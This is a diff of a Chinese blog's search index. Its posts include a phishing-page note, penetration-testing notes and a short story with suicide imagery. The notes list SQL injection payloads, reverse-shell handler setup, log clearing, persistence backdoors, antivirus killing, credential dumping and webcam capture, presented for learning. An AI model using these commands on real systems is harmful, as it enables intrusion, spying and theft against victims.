start</code></pre><p>制作钓鱼页面内容</p><pre><code>cd /var/www/htmlvim index.html</code></pre><p>设置ip转发以尽量隐藏自己</p><pre><code>echo &quot;1&quot; &gt; /proc/sys/net/ipv4/ip_forward #为0时取消转发</code></pre><p>靶机没能成功打开页面可能是没清除缓存<br>清除dns缓存 </p><pre><code>ipconfig /flushdns</code></pre><blockquote><p>相关<br>setookit 社会工程学 伪造页面收集登陆者信息</p></blockquote><span style="color: gray; font-size:;">笔记内容摘自网络，仅供记录与学习</span>]]></content>
+      
+      
+      <categories>
+          
+          <category> 计算机 </category>
+          
+          <category> 渗透 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 渗透笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>渗透笔记(持续更新)</title>
+      <link href="/2024/12/11/%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/"/>
+      <url>/2024/12/11/%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/</url>
+      
+        <content type="html"><![CDATA[<h2 id="如何入门渗透"><a href="#如何入门渗透" class="headerlink" title="如何入门渗透"></a>如何入门渗透</h2><p>入门的话看这一本就够了，有计算机基础看的更舒服<br>《Kali  Linux渗透测试技术详解》<br>链接：<a href="https://pan.baidu.com/s/1s7YAn6A5q7CQONUMVVZoZQ?pwd=8888">https://pan.baidu.com/s/1s7YAn6A5q7CQONUMVVZoZQ?pwd=8888</a><br>提取码：8888</p><blockquote><p>以下内容就是总结自此书，所以直接看书就行，不用往下翻了</p></blockquote><p>靶场<a href="https://www.vulnhub.com/">https://www.vulnhub.com/</a> 注意靶机适配的虚拟机软件<br>靶场详解 推荐观看<a href="https://space.bilibili.com/491748397">红队笔记</a></p><h3 id="也许你在找别的"><a href="#也许你在找别的" class="headerlink" title="也许你在找别的"></a>也许你在找别的</h3><p><a href="../webst">Web渗透</a>  &emsp;  <a href="../../12/%E7%AB%AF%E5%8F%A3">端口笔记</a> &emsp; <a href="../../12/%E6%89%A9%E5%B1%95">扩展工具</a></p><h2 id="序、一些入门了解尝试"><a href="#序、一些入门了解尝试" class="headerlink" title="序、一些入门了解尝试"></a>序、一些入门了解尝试</h2><p>  linux kali安装(我用Hyper-V安的但是非常后悔，推荐Vmware)</p><p>  <a href="https://blog.csdn.net/wzk4869/article/details/132855372">linux bash基础命令</a></p><p>  apt命令    <a href="https://www.runoob.com/linux/linux-comm-apt.html">本命令具有超级牛力，moo~</a></p><blockquote><h3 id="有关服务"><a href="#有关服务" class="headerlink" title="有关服务"></a>有关服务</h3><pre><code>systemctl * enable/disable/start/stop/restart/status  启动服务 关闭服务 重启服务 状态查看service *  同上chkconfig *  设置开机启动 关闭开机启动  </code></pre></blockquote><p>  Proxychains代理设置 通过代理执行命令</p><pre><code>vim /etc/proxychains4.conf &lt;加需要代理的ip地址和开放端口&gt;#更改文件以修改代理服务</code></pre><p>  常用 http(s)8080  socks 1080<br>  命令行中使用 在软件前加 proxychains4 如 <code>proxychains4 git clone ……</code><br>  测试<code>ip crul cip.cc</code>  测试代理<code>ip proxychains4 crul cip.cc</code></p><p>Tor网络代理 通过多结点隐藏行为 </p><h2 id="一、信息嗅探"><a href="#一、信息嗅探" class="headerlink" title="一、信息嗅探"></a>一、信息嗅探</h2><blockquote><p>DNS枚举</p></blockquote><pre><code> dnsenum --enum 网址 -w whois --threads[num]</code></pre><p>多进程 <code>-r</code>递归查询 <code>-d</code>请求间隙 <code>-o</code>输出位置  <code>fierce</code>子域查找 <code>-dns </code>网址</p><blockquote><p>SNMP枚举 </p></blockquote><pre><code>snmpwalk    -c public &lt;ip&gt; -v 2csnmpcheck   -t &lt;ip&gt;</code></pre><p>192.168.0.104常用路由器管理员登录地址</p><blockquote><p>域名查询  Dmitry  </p></blockquote><pre><code>dmitry -wnpb &lt;ip&gt;</code></pre><blockquote><p>nslookup 反向域名解析 </p></blockquote><p>转换域名为子网掩码 </p><pre><code>netmask -s &lt;ip&gt;</code></pre><blockquote><p>路由跟踪 Scapy<br>发送、嗅探、剖析和伪造网络数据包</p></blockquote><h3 id="主动收集信息"><a href="#主动收集信息" class="headerlink" title="主动收集信息"></a>主动收集信息</h3><p>  具有攻击性 留下痕迹</p><blockquote><p><a href="https://blog.csdn.net/2302_82189125/article/details/135961736">Nmap</a>查询在线，端口，嗅探服务器<br>查看tcp端口  <code>-sP</code> 查看是否在线 <code>Nping</code>（套具）获取详细信息<br>查找指定端口范围 <code>-p ?-??? &lt;ip&gt;</code>    输出文件<code>-oG 路径</code>  指纹识别 <code>-A</code><br>详细输出 <code>-v</code><br>Zenmap GUI化工具 扫描大型网络和主机</p></blockquote><h3 id="APR欺骗"><a href="#APR欺骗" class="headerlink" title="APR欺骗"></a>APR欺骗</h3><p>Netdiscover ARP侦查工具 攻击扫描局域网内主机   </p><pre><code>arpspoof -i eth0 -t &lt;ip&gt; -r &lt;默认网关&gt; #断网指令 条件:网卡正确 处于同一网段    </code></pre><p><code>arp -a</code> ip转mac </p><blockquote><p><a href="https://blog.csdn.net/zzwwhhpp/article/details/113077747">Wireshark</a>截取数据包</p></blockquote><h3 id="非主动信息收集"><a href="#非主动信息收集" class="headerlink" title="非主动信息收集"></a>非主动信息收集</h3><p>好处是没有痕迹，不易被发现</p><p>Maltego 图形化信息收集 被动收集信息 通过网络遍历目录等方式收集 不留痕迹 可结合shodan使用</p><p>SHODAN 搜索引擎（服务器）：<a href="https://www.shodanhq.com/">https://www.shodanhq.com</a> </p><p>社工库</p><p>引擎（一般用）：<a href="https://searx.org/">https://searx.org/</a></p><h2 id="二、漏洞扫描"><a href="#二、漏洞扫描" class="headerlink" title="二、漏洞扫描"></a>二、漏洞扫描</h2><p><a href="https://cve.mitre.org/index.html">CVE</a><br><a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a></p><h3 id="主机漏洞扫描"><a href="#主机漏洞扫描" class="headerlink" title="主机漏洞扫描"></a>主机漏洞扫描</h3><p>Nessus<br>  优点：功能全面，可视化界面现代化<br>  缺点：功能收费，限制次数<br>  配置完成后127.0.0.1：8834打开网页</p><p>OpenVAS<br>  脱离自Nessus，优点就是免费</p><p>Web漏洞扫描<br>  nikto wepscan burpsuite yakit</p><h2 id="三、漏洞利用"><a href="#三、漏洞利用" class="headerlink" title="三、漏洞利用"></a>三、漏洞利用</h2><p>Metasploitable操作系统 用于漏洞测试<br>metasploit漏洞检测工具  GUI -&gt; Armitage</p><blockquote><p>msfconsle初始化控制台</p></blockquote><p>  <code>search</code> 查找漏洞 <code>ms17_010</code> 永恒之蓝0号漏洞 <code>use 0</code>利用此0号漏洞</p><p>  <code>show options</code> 查看必选项 <code>set RHOSTS &lt;ip&gt;</code>配置目标主机</p><p>  <code>run</code>运行</p><blockquote><p>msfvenom木马</p></blockquote><pre><code class="bash">use exploit/multi/handler #选择模块-p linux/x64/meterpreter/reverse_tcp #根据系统选择合适的payloadset lhost &lt;ip&gt; #配置监听主机</code></pre><p><code>-x</code>捆绑木马 <code>-o</code>输出文件 <code>-f</code>文件格式</p><p><code>msfcli</code>命令行控制 </p><p><code>meterperter</code> 触发漏洞后返回控制通道</p><p>Themida加壳,提高免杀能力和隐蔽性</p><blockquote><p>SQL注入 命令执行漏洞  </p></blockquote><pre><code class="sql">&#39; union select user,password form users # 获取数据库 1&#39; union select null,database（）; #获取数据库名#select要求行数一致 null在补行数1&#39; union select null,table_name from information_schema.tables where table_schema=&#39;数据库名&#39;;#获取特定数据库所有表名1&#39; union select  form &#39;表名&#39; ;#获取表内容 </code></pre><p><code>--dbs</code>列出所有可用数据库<code>-D</code> 加数据库名表示针对  <code>--tables</code>列出数据库表<br><code>-T</code>加表名针对 <code>--columns</code>列出表项 <code>--dump</code>读取数据<br>F12打开控制台，选择<code>网络</code> 刷新页面获取cookie</p><p><a href="https://blog.csdn.net/liver100day/article/details/117585795">WPScan</a> 攻击基于WrodPress搭建的网页（blog）</p><h2 id="四、进阶渗透"><a href="#四、进阶渗透" class="headerlink" title="四、进阶渗透"></a>四、进阶渗透</h2><h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>提权的方法很多，包括但不限于假冒令牌、爆破密码、提权漏洞、php提权、python提权等等。</p><h3 id="攻击载荷（payload）"><a href="#攻击载荷（payload）" class="headerlink" title="攻击载荷（payload）"></a>攻击载荷（payload）</h3><p>反弹式shell  目标主机-&gt;攻击主机传递shell<br>Bind  shell 在目标系统上绑定shell至监听窗口 攻击者连接打开的端口来取得shell交互</p><h3 id="中间人攻击（MITM）"><a href="#中间人攻击（MITM）" class="headerlink" title="中间人攻击（MITM）"></a>中间人攻击（MITM）</h3><p>Ettercap 执行命令 ettercap -G 打开图形界面<br>停止嗅探后 还需停止中间人攻击<br>Subterfuge自动化中间人攻击工具 127.0.0.1：80访问网页</p><h3 id="密码攻击"><a href="#密码攻击" class="headerlink" title="密码攻击"></a>密码攻击</h3><p><a href="https://www.toolhelper.cn/DigestAlgorithm/SHA">哈希破解工具网站</a></p><h4 id="在线破解"><a href="#在线破解" class="headerlink" title="在线破解"></a>在线破解</h4><p><a href="https://blog.csdn.net/m0_59598029/article/details/133217000">Hydra</a><br>能否破解只与字典是否强大相关 图形工具xHydra<br>kali自带常用字典: wordlists  </p><p>自定义创建字典工具<a href="https://blog.csdn.net/qq_38319566/article/details/107737119">Crunch</a></p><pre><code class="bash">crunch [min length][max length] [character set (包含元素)][options（比如输出文件-o）]</code></pre><p>msfconsole<br>执行 <code>search email collector</code> 收集组织邮件信息构建字典 <code>mimikatz</code> 破解恢复纯文本密码</p><p><a href="https://blog.csdn.net/weixin_44257023/article/details/126976129">Medusa尝试获取远程验证访问权限</a></p><h4 id="离线破解"><a href="#离线破解" class="headerlink" title="离线破解"></a>离线破解</h4><pre><code>哈希值识别 hash-identifier破解哈希值密码 findmyhash &lt;哈希值类型&gt; -h hashMetaploit psexec绕过哈希值建立会话John the ripper暴力密码破解器 rtgen 生成彩虹表（哈希值集合 随密码复杂程度增大 主流100G）无线网络渗透 Kismet嗅探工具  fluxion wifi钓鱼工具</code></pre><h2 id="五、清除痕迹"><a href="#五、清除痕迹" class="headerlink" title="五、清除痕迹"></a>五、清除痕迹</h2><h3 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h3><p>激活Meterpreter对话</p><h4 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h4><pre><code class="bash">msf exploit(handler)&gt; sessions -i 1</code></pre><h4 id="执行命令-1"><a href="#执行命令-1" class="headerlink" title="执行命令"></a>执行命令</h4><pre><code class="bash">meterpreter&gt;irb</code></pre><h4 id="指定日志"><a href="#指定日志" class="headerlink" title="指定日志"></a>指定日志</h4><h4 id="执行命令-2"><a href="#执行命令-2" class="headerlink" title="执行命令"></a>执行命令</h4><pre><code class="bash">log=client.sys.eventlog.open`(&#39;文件名&#39;)</code></pre><pre><code>常有文件名:&#39;system&#39;  &#39;security&#39;  &#39;application&#39;   &#39;directory service&#39;  &#39;dns server&#39; &#39;file replication service&#39;</code></pre><h4 id="清除日志"><a href="#清除日志" class="headerlink" title="清除日志"></a>清除日志</h4><p>执行命令</p><pre><code class="bash">log.clear</code></pre><h2 id="六、创建后门"><a href="#六、创建后门" class="headerlink" title="六、创建后门"></a>六、创建后门</h2><h3 id="具体步骤-1"><a href="#具体步骤-1" class="headerlink" title="具体步骤"></a>具体步骤</h3><p>激活Meterpreter对话<br>如上 </p><pre><code class="bash">run persistence -h #查看后门帮助文件</code></pre><pre><code class="bash">run persistence -U -A -i 10 - 8090（端口） -r 目标ip #创建后门 </code></pre><h2 id="七、后渗透"><a href="#七、后渗透" class="headerlink" title="七、后渗透"></a>七、后渗透</h2><p>#以下为meterpreter中命令</p><p>刚获得shell时 shell是很脆弱的 实战中需要先进一步操作</p><pre><code class="bash"> getpid #获取pid migrate &lt;num&gt; #将目标转移到某进程 kill  &lt;num&gt; #杀死某进程 一般是杀死之前残留的进程 run post/windows/manage/killav #关闭杀毒软件getuid #查看用户名run post/windows/gather/checkvm #查看目标是否为虚拟机 idletime #查看运行时间route #查看完整网络配置background #将meterpreter终端隐藏指后台route add #添加路由 route print查看路由 添加路由后可以用此目标机对其他网络进行攻击 也就是成为了肉鸡run post/windows/manage/enable_rdp #启动3389远程桌面run post/windows/manage/autoroute #查看目标机本地子网情况run post/windows/gather/enum_logged_on_users #列举多少用户登录此主机run post/windows/gather/enum_applications  #列举应用程序run windows/gather/credentials/windows_autologin #抓取自动登陆的用户名和密码#如果抓取失败 可以用Espia插件 load espia加载此插件 screengrab或者screenshot抓取屏幕截图webcam_list #查看目标机是否有摄像头webcam_snap #打开摄像头 拍一张照片webcam_stream #开启直播模式 //直播地址Shell #进入命令行pwd getlwd ls cd search download upload #文件系统命令 </code></pre><p>提权</p><pre><code class="bash">whoami  /groups    #查看权限 类似操作还有 &lt;sudo -l&gt;  &lt;getuid&gt; getsystem  #提权尝试systeminfo #查看补丁</code></pre><p>假冒令牌</p><blockquote><p>我们先输入use incognito命令，然后输入list_tokens-u列出可用的token<br>接下来在incognito中调用impersonate_token命令假冒Administrator用户进行攻击 具体命令 impresionate_token &lt;主机名&gt;\用户名<br>运行成功后在Meterpreter Shell下运行shell命令并输入whoami 可查看到当前已经成为此用户<br>PwDump是一款Win32环境下的系统授权信息导出工具，目前没有任何一款工具可以导出如此全面的信息、支持这么多的OS版本，而且相当稳定</p></blockquote><pre><code class="bash">-dhl：导出本地哈希值。-dhdc：导出内存中的域控哈希值。-dhd：导出域控哈希值，必须指定NTDS文件。-db：导出Bitlocker信息，必须指定NTDS文件。-nt：导出NTDS文件。-hist：导出历史信息，可选项。-t：可选导出类型，默认导出John类型。-o：导出文件到本地。</code></pre><pre><code>WCE windows内网渗透工具         upload 路径/wce.exe C:\上传wce到靶机C盘 在目标shell下输入wce -w 提取管理员密码     -l 读取数据格式 -f 强制安全读取 -g计算密码Mimikatz  轻量级调试器 用于抓取密码 模拟令牌 获取票据、证书、私钥 绕过远程终端等  已集成在meterpreter中      条件：1 已成为管理员 2 windows2000和xp不能用 3 32位 64位也可以 但是会有一些麻烦持续后门生成：CymothoaPersistence    #meterpreter提供Web后门 ：菜刀、蚁剑meterpreter payload：PHP Meterpreter</code></pre><p>杀死当前所有进程</p><pre><code class="bash">for /f &quot;tokens=1&quot; %i in (&#39;tasklist ^| findstr /I /R &quot;.*&quot;&#39;) do taskkill /F /PID %i （win）pkill -u $USER（linux）</code></pre><span style="color: gray; font-size:;">声明：部分摘自网络，仅供学习交流。另，学艺不精，欢迎斧正</span>]]></content>
+      
+      
+      <categories>
+          
+          <category> 计算机 </category>
+          
+          <category> 渗透 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 渗透笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>日志（3）</title>
+      <link href="/2024/12/11/%E6%97%A5%E5%BF%97%EF%BC%883%EF%BC%89/"/>
+      <url>/2024/12/11/%E6%97%A5%E5%BF%97%EF%BC%883%EF%BC%89/</url>
+      
+        <content type="html"><![CDATA[<h2 id="部分站内链接首次返回404的问题解决"><a href="#部分站内链接首次返回404的问题解决" class="headerlink" title="部分站内链接首次返回404的问题解决"></a>部分站内链接首次返回404的问题解决</h2><p>原因是首次查找了根目录下的目录而非同级目录，解决办法是替换当前相对路径为根目录相对路径。如依旧有页面丢失的问题，请告知我。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 日志 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 日志 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>最后的告别</title>
+      <link href="/2024/12/11/%E6%9C%80%E5%90%8E%E7%9A%84%E5%91%8A%E5%88%AB/"/>
+      <url>/2024/12/11/%E6%9C%80%E5%90%8E%E7%9A%84%E5%91%8A%E5%88%AB/</url>
+      
+        <content type="html"><![CDATA[<h3 id="作品介绍"><a href="#作品介绍" class="headerlink" title="作品介绍"></a>作品介绍</h3><pre><code>实际写于2022年冬，所幸当时给一个好友看，就拍了照，现在摘录在这里。出于对过去自己的尊重，即使有的地方不舒服，我也没有做多少更改。那段时间是我难过又愤怒的时候，渴望着创作，思想又被负面情绪禁锢着。</code></pre><p>不知道什么时候，学校里来了只硕大的乌鸦</p><p>学校里有很多乌鸦,多的时候路上编地遗粪，学生走路要打伞;但从没有过这只乌鸦这样的体型——身子一缩如一柄巨大的乌黑的伞,那的颗朱红色的眼睛如同缀在伞上的佛珠</p><p>血染的佛珠。</p><p>人群熙熙攘攘，不同的目的地，却在争先恐后。学校路很窄，庞大的人流不允许你驻足,每个人都有自己的目的地，但有些人是被裹挟着前往目的地的。明明有草坪，但草坪不是路。如果没有人，我可以在草坪上打个滚。猫也爱在草坪上打滚。</p><p>我做了个噩梦,梦见我在学校图书馆楼梯那里爬上爬下,一道道门被我推开，最后一道门紧闭着，永远是最后一道门闭着。这是个噩梦啊,我出不去了，哪里都出不去了，这最后一层门后就是我想看的书。成群的人捧着自己心怡的书,而我心仪的书遗弃在书架上,落在尘埃里。我能听见其它的书都在骂它，笑话它。它委屈地缩成一团……</p><p>啊，我是选定这本书的人。我应该一脚跺开这该死的门，让提着灯夜读的学生们一哆嗦，我奔着这本书去，又小心翼翼地将它从灰尘中拾起，我把嘲笑它的书都撕烂，甩在那群学生的脸上，我拿起一根铅笔在一本厚厚的书上搓呀搓，终于，书着了，我左手揣着我心怡的书，右手将冒了烟的书扔进书堆，霎时燃起雄雄烈火。</p><p>啊！我把图书馆烧了！</p><p>什么孔庄老孟，什么苏格拉底,什么耶稣耶和华，什么阿尔卑斯山诸神，都在这片火焰里哭泣哀号，蛆虫般扭动的身躯，面具般歪裂的面孔，全无了千年的人类至高荣耀，在讨饶，在号陶。图书馆所有书，连同这世上所有书，都被这火海吞噬干净了。除了我手上这本心怡之书——《母猪的产后护理》。我无比珍惜地看着它，眼神如恋人般深情，现在，它就是人类的最高智慧。</p><p>——但首先我需要端开这道门。我抬起脚，又放下了。</p><p>可是我抬头看到了什么——我什么都没有看到。在这两道门相隔的空间里，没有监控，这就是一处完全幽闭着的空间,没人知道这里，没有人会来到这里。</p><p>那么我可以做我想做的任问事的,我可以尽露丑态,没关系,没有人知道,永远不会有。这文明的外衣我穿够了，我撕扯下来,我脱下人皮,我是头野兽,我为所欲为,我要……不，我不会跟你们说的，因为这里没有摄像头。从一道道门里出来,你们会看到我披着精致的人皮外衣,举止优雅，淡吐得体，似乎我一向如此。</p><p>可是,是不是太快了，我还没享受够……等等,可这是个噩梦，噩梦应当是使你产生惧怕的梦,是醒来之后心脏砰砰直跳的梦，梦见锋利的锐器向你袭来而无处遁逃，惧怕之人迈着脚步向你逼近……</p><p>嘘，坠下去,放轻松,坠下去……</p><p>那深处是一片漆黑……但并非空无一物，你能看到和自己长得一模一样的人,十多年里的你，每个都眼神空洞……那就是你，做着各种各样的事情，在这片什么都看不到的黑暗里,你看得到你自己，你难过得想哭,所有的你都难过得想哭。</p><p>你抱住其中一个。</p><p>他那时正茫然地看着一扇掉了玻璃的窗子。他的房子很破，很小，他的手还拿着一只笔，他在写，眼睛却朝看窗子。他半张着嘴,你靠近他,你听见呼隆呼隆的风声，好似手机的音量忽然调高,骤然的雷声让你那颗停滞的心脏险些跳动。你看见他眼角挂着什么，发亮。</p><p>你抱住他。</p><p>那时的你永远不会想到抱住他的是你。他在听风，他在听雷，他在恐惧那窗掉下去的玻璃砸死了他的另一个恐惧。他正在恐惧着，忽然被什么无形的好似带着些温软的东西裹挟住了。</p><p>那么现在换作了你，他抬头看你，你抱着他，很温暖，他感激地看你。你发觉怀里空空的了,那点光晕化作了碎片,那是这片黑暗里唯一的光,你好象看见一只胡蝶，它好像在绕着根蜡烛扑扇着翅膀。那是光,碎片里的光，金色的光芒；还有一粒白光，那是一点晶莹。</p><p>你转身,那是校园里的人行道，你高中的校园，难以忘记的模样。你看到你在人行道上遥遥走来。夜里点亮了路灯，他伏在路灯旁。</p><p>你坐下。眼前是一条静如死水的河，突然被一阵瓢泼打破了宁静。你这才发觉你坐在河边的台阶上,浑身湿透,你左边的人撑着伞，还悠然地听着歌,他好像在等人。</p><p>你扭头,一个男孩趴在电脑键盘上呜呜地哭,电脑屏幕上是一首诗，你认得这是哪里，这是你家呀，满地东西杂乱不堪。男孩身上笼着一道白光,电脑屏幕的字在跳动，画面在切换，变成动画、游戏、网络小说。男孩不知道什么时候不哭了,他静静地趴着好像睡看了。白光消失了。</p><p>永远是夜晚 水远没有白天。</p><p>你靠近，轻触他的胳膊,抬起一点后惊悸地后退。</p><p>男孩的右手紧紧抓住一把刀，那刀深深刺进了他的胸脯,血沿着袖口流下,一滴一滴。</p><p>你忍不住咧嘴,笑容刚露出来却又凝固住了,豆大的泪珠在眼眶里打转,你嗓子里出发出哭音,那哭音一颤一颤，变成了笑声,你放声笑了,笑得愈凶狠,眼泪越溢得汹涌。</p><p>所有人都围了上来。</p><p>呆带的眼神里好像掺入了疑感。他们看着他，有人拽拽他的胳膊，有人晃他的脑袋，还有人想把他抽起来，可他自己本就没有半分气力。</p><p>他站在那里，不笑了.不哭了,瞪着他们,突然大吼:“我恨你们!”</p><p>恶梦的尽头呀。</p><p>声音在这里没有半点回响，好像刚从海面跃起的鱼就进了海鸟的肚子。</p><p>他们愣愣地看看他，眼睛一眨不眨。他比他们都大啊，他们最小才几岁啊，最大也没他大呀,他恨他们,他不也来到这里了吗?他们好像第一次看见他，第一次认识他；他们第次看到他,第一次认识他，而他却恨他们。</p><p>他们突然不约而同都露出微笑,那一张张呆滞的脸仿佛又重新拥有了生命。他们围上来,他害怕地想要后退。</p><p>他们围住他，抱成一团，把他抱在最中心。</p><p>那是最深不见底的黑暗,那是噩梦的尽头,在最不可能存在光明的角落，悄然绽放出结着最幽静的光芒的曼陀罗。他们的幻影在黑暗中褪去身形,几十道光晕化作漫天飞舞的蝴蝶,再高一点的地方,地狱化作天堂。</p><p>蝴蝶的裹挟中，泪水无法抑制地流淌在脸上。</p><p>男孩的身体被蝴蝶托了起来,胸口的匕首就像一捧灰被风刮去。</p><p>他的面容很安祥,嘴角勾着。他的手掌张开，手心是一簇白光。</p><p>我知道那是留给我的,我小心翼翼地捧过，看着他的身躯随风而散。在我生命中一个微微小的角落,我听见“咔”的一声，那么微弱，如同幻觉。</p><p>我推开那扇门，走出图书馆,迎面是那只硕大的乌鸦。血淋淋的目光俯瞰着熙熙攘攘的人群,没有人看它一眼,所有人都急匆匆地走着，走向自己的目的地。它狩猎失败了，它的眼里尽是不甘。它必须要走了，它不肯饿着,它要换个阵地去，与那些落单的倒霸蛋对视，让他们成为它的美餐……</p><p>它扑扇了个翅膀离去了，树林里响起一片“呱呱”的应和声。</p><pre><code>   与其期待他人救赎，不如明白能给你希望的正是你自己。</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> 生活 </category>
+          
+          <category> 文章 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 小说 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>当今中国青年阶层分析</title>
+      <link href="/2024/12/11/%E5%BD%93%E4%BB%8A%E4%B8%AD%E5%9B%BD%E9%9D%92%E5%B9%B4%E9%98%B6%E5%B1%82%E5%88%86%E6%9E%90/"/>
+      <url>/2024/12/11/%E5%BD%93%E4%BB%8A%E4%B8%AD%E5%9B%BD%E9%9D%92%E5%B9%B4%E9%98%B6%E5%B1%82%E5%88%86%E6%9E%90/</url>
+      
+        <content type="html"><![CDATA[<p>作者:<a href="https://baike.baidu.com/item/%E6%A2%81%E6%99%93%E5%A3%B0/1409387">梁晓声</a></p><h2 id="不差钱的”富二代”"><a href="#不差钱的”富二代”" class="headerlink" title="不差钱的”富二代”"></a>不差钱的”富二代”</h2><p>报载，当下中国有一万余位资产在2亿以上的富豪们，”二世祖”是南方民间对他们儿女的叫法。关于他们的事情民间谈资颇多，人们常津津乐道。某些报刊亦热衷于兜售他们的种种事情，以财富带给他们的”潇洒”为主，羡慕意识流淌于字里行间。</p><p>窃以为，一万多相对于十三亿几千万人口，相对于四亿几千万中国当代青年，实在是少得并没什么普遍性，并不能因为他们是某家族财富的”二世祖”，便必定具有值得传媒特别关注之意义。</p><p>故应对他们本着这样一种报道原则——若他们做了对社会影响恶劣之事，谴责与批判；若他们做了对社会有益之事，予以表扬与支持。否则，可当他们并不存在。</p><p>在中国，值得给予关注的群体很多，非是不报道”二世祖”们开什么名车，养什么宠物，第几次谈对象便会闲得无事可做。传媒是社会的”复眼”，过分追捧明星已够讨嫌，倘再经常无端地盯向”二世祖”们，这样的”复眼”自身毛病就大了。</p><p>由于有了以上”二世祖”的存在，所谓”富二代”的界定难免模糊。倘不包括”二世祖”们，”富二代”通常被认为是这样一些青年——家境富有，意愿实现起来非常容易，比如出国留学，比如买车购房，比如谈婚论嫁。</p><p>他们的消费现象，往往也倾向于高档甚至奢侈。和”二世祖”们一样，他们往往也拥有名车。他们的家庭资产分为有形和隐形两部分：有形的已很可观，隐形的究竟多少，他们大抵并不清楚，甚至连他们的父母也不清楚。</p><p>我的一名研究生曾幽幽地对我说：”老师，人比人真是得死。我们这种学生，毕业后即使回省城谋生，房价也还是会让我们望洋兴叹。可我认识的另一类大学生，刚谈恋爱，双方父母就都出钱在北京给他们买下了三居室，而且各自一套。只要一结婚，就会给他们添辆好车。北京房价再高，人家也没有嫌高的感觉！”——那么，”另一类”或”人家”自然便是”富二代”了。</p><p>我还知道这样一件事——女孩在国外读书，忽生明星梦，非要当影视演员。于是母亲带女儿专程回国，到处托关系，终于认识了某一剧组的导演，声明只要让女儿在剧中饰一个小角色，一分钱不要，还愿意反过来给剧组几十万。导演说您女儿也不太具有成为演员的条件啊，当母亲的则说，那我也得成全我女儿，让她过把瘾啊！——那女儿，也当属”富二代”无疑了。</p><p>如此这般的”富二代”，他们的人生词典中，通常没有”差钱”二字。</p><p>他们的家长尤其是父亲们，要么是中等私企老板，要么是国企高管，要么是操实权握财柄的官员。倘是官员，其家庭的隐形财富有多少，他们确乎难以了解。</p><p>他们往往一边享受着”不差钱”的人生，一边将眼瞥向”二世祖”们，对后者比自己还”不差钱”的生活方式消费方式每不服气，故常在社会上弄出些与后者比赛”不差钱”的响动来。</p><p>我认为，对于父母是国企高管或实权派官员的他们，社会应予必要的关注。因为这类父母中不乏现行弊端分明的体制的最大利益获得者及最本能的捍卫者。</p><p>这些身为父母的人，对于推动社会民主、公平、正义是不安且反感的。有这样的父母的”富二代”，当他们步入中年，具有优势甚至强势话语权后，是会站在一向依赖并倍觉亲密的利益集团一方，发挥本能的维护作用，还是会比较无私地超越那一利益集团，站在社会公平和正义的立场，发符合社会良知之声，就只有拭目以待了。</p><p>如果期待他们成为后一种中年人，则必须从现在起，运用公平、正义之自觉的文化使他们受到人文影响。而谈到文化的人文思想影响力，依我看来，在中国，不仅对于他们是少之又少微乎其微，即使对最广大的青年而言，也是令人沮丧的。</p><p>故我看未来的”富二代”的眼，总体上是忧郁的。不排除他们中会产生足以秉持社会良知的可敬人物，但估计不会太多。</p><p>在中国，如上之”富二代”的人数，大致不会少于一两千万。这还没有包括同样足以富及三代五代的文娱艺术界超级成功人士的子女。不过他们的子女人数毕竟有限，没有特别加以评说的意义。</p><h2 id="中产阶层家庭的儿女"><a href="#中产阶层家庭的儿女" class="headerlink" title="中产阶层家庭的儿女"></a>中产阶层家庭的儿女</h2><p>世界上任何一个国家，中高级知识分子家庭几乎必然是该国中产阶层不可或缺的成分。少则占1&#x2F;3，多则占一半。中国国情特殊，20世纪80年代以前，除少数高级知识分子，一般大学教授的生活水平虽比城市平民阶层的生活水平高些，但其实高不到哪儿去。</p><p>20世纪80年代后，这些人家生活水平提高的幅度不可谓不大，他们成为改革开放的直接受惠群体是无可争议的事实。不论从居住条件还是收入情况看，知识分子家庭的生活水平已普遍高于工薪阶层。另一批，正有希望跻身于中产阶层。最差的一批，生活水平也早已超过所谓小康。</p><p>然而2009 年以来的房价大飙升，使中产阶层生活状态顿受威胁，他们的心理也受到重创，带有明显的挫败感。</p><p>仅以我语言大学的同事为例，有人为了资助儿子结婚买房，耗尽二三十年的积蓄不说，儿子也还需贷款一百余万，沦为”房奴”，所买却只不过八九十平方米面积的住房而已。</p><p>还有人，夫妻双方都是五十来岁的大学教授，从教都已二十几年，手攥着百余万存款，儿子也到了结婚年龄，眼睁睁看着房价升势迅猛，不知如何是好，只有徒唤奈何。</p><p>他们的儿女，皆是当下受过高等教育的青年，有大学学历甚至是硕士、博士学历。这些青年成家立业后，原本最有可能奋斗成为中产阶层人士，但现在看来，可能性大大降低了，愿景极为遥远了。</p><p>他们顺利地谋到”白领”职业是不成问题的，然”白领”终究不等于中产阶层。中产阶层也终究得有那么点儿”产”可言，起码人生到头来该有产权属于自己的一套房子。</p><p>可即使婚后夫妻二人各自月薪万元，要买下一套两居室的房子，由父母代付部分购房款，也还得自己贷款一百几十万。按每年可偿还10万，亦需十几年方能还清。</p><p>又，他们从参加工作到实现月薪万元，即使工资隔年一升估计至少也需10 